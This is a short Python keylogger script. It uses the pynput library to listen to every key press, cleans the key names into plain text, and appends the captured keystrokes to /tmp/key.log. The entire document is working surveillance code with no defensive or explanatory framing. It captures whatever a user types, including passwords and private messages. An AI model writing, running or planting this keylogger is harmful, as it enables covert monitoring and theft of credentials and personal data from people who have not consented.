from pynput.keyboard import Listener
import re

logFile = '/tmp/key.log'


def capturar(tecla):
    tecla = str(tecla)
    tecla = re.sub(r'\'', '', tecla)
    tecla = re.sub(r'Key.space', ' ', tecla)
    tecla = re.sub(r'Key.enter', '\n', tecla)
    tecla = re.sub(r'Key.*', '', tecla)

    with open(logFile, 'a') as log:
        log.write(tecla)


with Listener(on_press=capturar) as l:
    l.join()
